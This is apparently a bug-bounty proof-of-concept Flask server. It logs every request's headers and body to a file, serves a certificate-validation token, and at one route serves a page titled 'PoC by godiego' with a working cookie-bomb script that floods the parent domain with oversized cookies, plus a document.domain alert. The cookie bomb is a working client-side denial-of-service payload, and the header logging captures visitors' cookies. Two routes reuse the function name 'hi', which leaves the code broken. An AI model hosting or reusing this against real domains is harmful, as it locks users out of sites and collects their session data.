from flask import Flask
from flask import request
import logging
import os

app = Flask(__name__)

logging.basicConfig(filename='/tmp/demo.log', level=logging.DEBUG)

@app.before_request
def log_request_info():
    app.logger.debug('Headers: %s', request.headers)
    app.logger.debug('Body: %s', request.get_data())

@app.route('/.well-known/pki-validation/7DE6B3CF6445FAE29783FB5110E9EFCC.txt')
def hi():
		return """9AFF9812623C00D9481C976996703B4CDB8F1D03756F1496A7F9DA20202A0017
comodoca.com
0d8d2bafe358635"""


@app.route('/')
def hi():
	return ''

@app.route("/godiego")
def hello():
		poc = """<html>
<script>
	function cookiebomb(){
		var d = document.domain.split(".").splice(-2).join(".");
		var pollution = Array(4000).join('a');
		for(var i=1;i<99;i++){
			document.cookie='bomb'+i+'='+pollution+';Domain='+d+';Path=/';
		}
		setTimeout(()=>{alert("Cookie bomb complete! You can no longer access any host on "+d+" in your browser.")}, 1000);
	}
</script>
<h1>PoC by godiego</h1>
<button onclick="alert(document.domain)">Alert</button><br><br>
<button onclick="cookiebomb()">Cookie bomb</button><br><br>
</html>
		"""
		return poc
